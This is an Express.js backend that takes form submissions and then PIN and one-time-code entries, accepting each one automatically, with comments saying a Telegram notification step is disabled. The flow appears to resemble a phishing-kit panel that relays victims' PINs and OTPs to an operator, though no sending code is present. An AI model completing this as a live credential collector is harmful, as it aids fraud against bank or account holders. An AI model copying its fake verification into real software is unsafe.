import express from 'express';
import dotenv from 'dotenv';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3001;

app.use(express.json());

// Serve static files from build directory (for production)
if (fs.existsSync(path.join(__dirname, 'build'))) {
  app.use(express.static(path.join(__dirname, 'build')));
}

// Store form submissions in memory (in production, use a database)
const formSubmissions = new Map();

// Endpoint to receive form submissions from the frontend
app.post('/api/submit-form', async (req, res) => {
  try {
    const formData = req.body;
    
    // Generate unique ID for the submission
    const submissionId = Date.now().toString();
    formSubmissions.set(submissionId, {
      ...formData,
      id: submissionId,
      submissionId: submissionId,
      status: 'approved',
      pinVerified: false,
      pinStatus: 'pending',
      timestamp: new Date().toISOString()
    });

    // Telegram notifications disabled
    console.log('Form submitted successfully (Telegram disabled)');

    res.json({ success: true, submissionId });
  } catch (error) {
    console.error('Error submitting form:', error);
    res.status(500).json({ success: false, error: 'Failed to submit form' });
  }
});

// Endpoint to check submission status
app.get('/api/submission/:id', (req, res) => {
  const submission = formSubmissions.get(req.params.id);
  if (submission) {
    res.json(submission);
  } else {
    res.status(404).json({ error: 'Submission not found' });
  }
});

// Endpoint to verify PIN
app.post('/api/verify-pin', async (req, res) => {
  try {
    const { submissionId, pin, formData } = req.body;
    
    const submission = formSubmissions.get(submissionId);
    if (!submission) {
      return res.status(404).json({ success: false, error: 'Submission not found' });
    }

    // Auto-approve PIN (Telegram disabled)
    submission.pinVerified = true;
    submission.pinStatus = 'correct';
    console.log('PIN verified successfully (Telegram disabled)');

    res.json({ success: true, message: 'PIN verified' });
  } catch (error) {
    console.error('Error verifying PIN:', error);
    res.status(500).json({ success: false, error: 'Failed to verify PIN' });
  }
});

// Endpoint to check PIN verification status
app.get('/api/pin-status/:id', (req, res) => {
  const submission = formSubmissions.get(req.params.id);
  if (submission) {
    res.json({
      pinVerified: submission.pinVerified || false,
      pinStatus: submission.pinStatus || 'pending'
    });
  } else {
    res.status(404).json({ error: 'Submission not found' });
  }
});

// Endpoint to verify OTP
app.post('/api/verify-otp', async (req, res) => {
  try {
    const { submissionId, otp, formData } = req.body;
    
    const submission = formSubmissions.get(submissionId);
    if (!submission) {
      return res.status(404).json({ success: false, error: 'Submission not found' });
    }

    // Auto-approve OTP (Telegram disabled)
    submission.otpVerified = true;
    submission.otpStatus = 'correct';
    console.log('OTP verified successfully (Telegram disabled)');

    res.json({ success: true, message: 'OTP verified' });
  } catch (error) {
    console.error('Error verifying OTP:', error);
    res.status(500).json({ success: false, error: 'Failed to verify OTP' });
  }
});

// Endpoint to check OTP verification status
app.get('/api/otp-status/:id', (req, res) => {
  const submission = formSubmissions.get(req.params.id);
  if (submission) {
    res.json({
      otpVerified: submission.otpVerified || false,
      otpStatus: submission.otpStatus || 'pending'
    });
  } else {
    res.status(404).json({ error: 'Submission not found' });
  }
});

// SPA fallback - serve index.html for all non-API routes (production only)
app.get('*', (req, res) => {
  if (fs.existsSync(path.join(__dirname, 'build', 'index.html'))) {
    res.sendFile(path.join(__dirname, 'build', 'index.html'));
  } else {
    res.status(404).json({ error: 'Not found - run npm run build first' });
  }
});

// Set up server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

export default app;
